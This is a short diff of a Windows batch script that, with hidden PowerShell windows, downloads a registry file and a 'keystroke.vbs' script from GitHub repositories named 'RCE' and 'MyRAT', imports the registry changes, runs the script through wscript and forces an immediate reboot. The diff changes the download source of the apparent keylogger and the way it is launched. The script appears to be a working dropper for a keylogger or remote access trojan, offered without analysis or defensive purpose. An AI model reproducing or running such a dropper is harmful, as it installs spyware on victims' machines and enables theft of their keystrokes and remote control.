@@ -27,6 +27,6 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://github.com/bruning-frighting/RCE/blob/main/dis.reg' -OutFile 'dis.reg'"
 reg import dis.reg
-powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://github.com/bruning-frighting/MyRAT/blob/main/keystroke.vbs' -OutFile 'keystroke.vbs'"
-powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -FilePath 'wscript.exe' -ArgumentList '\"keystroke.vbs\"' -NoNewWindow -Wait"
+powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://github.com/bruning-frighting/RCE/blob/main/keystroke.vbs' -OutFile 'keystroke.vbs'"
+powershell wscript.exe .\keystroke.vbs
 shutdown /r /t 0
